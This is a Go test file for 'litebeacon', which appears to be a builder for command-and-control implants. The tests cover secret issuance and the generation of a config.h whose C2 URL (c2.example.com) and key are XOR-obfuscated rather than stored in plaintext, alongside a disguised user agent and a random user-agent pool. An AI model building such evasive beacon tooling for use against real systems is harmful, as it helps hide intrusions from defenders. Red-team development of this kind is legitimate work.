package litebeacon

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadSecretsIssuesDefault(t *testing.T) {
	path := filepath.Join(t.TempDir(), "lite", "secrets.json")
	reg, err := LoadSecrets(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(reg.List()) != 1 {
		t.Fatalf("want 1 default secret, got %d", len(reg.List()))
	}
	if _, err := os.Stat(path); err != nil {
		t.Fatal("secrets file not persisted")
	}
	entry, ok := reg.Latest()
	if !ok || entry.KeyName == "" || len(entry.SecretB64) != 44 {
		t.Fatalf("bad default entry: %#v", entry)
	}
}

func TestIssueAppendsAndPersists(t *testing.T) {
	path := filepath.Join(t.TempDir(), "secrets.json")
	reg, err := LoadSecrets(path)
	if err != nil {
		t.Fatal(err)
	}
	first, _ := reg.Latest()
	second, err := reg.Issue("console")
	if err != nil {
		t.Fatal(err)
	}
	if second.SecretB64 == first.SecretB64 {
		t.Fatal("secrets must differ")
	}
	reloaded, err := LoadSecrets(path)
	if err != nil {
		t.Fatal(err)
	}
	entries := reloaded.List()
	if len(entries) != 2 || entries[1].SecretB64 != second.SecretB64 {
		t.Fatalf("reload lost entries: %#v", entries)
	}
}

func TestSecretB64DecodesTo32Bytes(t *testing.T) {
	reg, err := LoadSecrets(filepath.Join(t.TempDir(), "secrets.json"))
	if err != nil {
		t.Fatal(err)
	}
	entry, _ := reg.Latest()
	secret, err := base64.StdEncoding.DecodeString(entry.SecretB64)
	if err != nil || len(secret) != 32 {
		t.Fatalf("bad secret encoding: %q", entry.SecretB64)
	}
}

func TestGenerateConfigH(t *testing.T) {
	reg, _ := LoadSecrets(filepath.Join(t.TempDir(), "secrets.json"))
	entry, _ := reg.Latest()
	text, err := GenerateConfigH(ConfigParams{
		URL:             "https://c2.example.com:8443/api/v2/sync",
		SecretB64:       entry.SecretB64,
		KeyName:         entry.KeyName,
		UserAgent:       "AppSync/2.4.1 (Linux x86_64)",
		BaseIntervalSec: 180,
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"#define CFG_XOR", "#define CFG_URL_LEN", "CFG_URL[", "CFG_KEY[32]",
		"#define CFG_INTERVAL 180", "#define LITE_CONFIG_H",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("config.h missing %q", want)
		}
	}
	if strings.Contains(text, "c2.example.com") {
		t.Fatal("config.h must not contain the plaintext URL")
	}
	if strings.Contains(text, entry.SecretB64) {
		t.Fatal("config.h must not contain the plaintext secret")
	}
}

func TestGenerateConfigHRejectsBadSecret(t *testing.T) {
	_, err := GenerateConfigH(ConfigParams{URL: "https://x/", SecretB64: "zz", KeyName: "data", UserAgent: "ua"})
	if err == nil {
		t.Fatal("expected error for bad secret")
	}
}

func TestRandomUserAgent(t *testing.T) {
	if RandomUserAgent() == "" {
		t.Fatal("user agent pool empty")
	}
	if len(userAgentPool) < 4 {
		t.Fatalf("pool too small: %d", len(userAgentPool))
	}
}
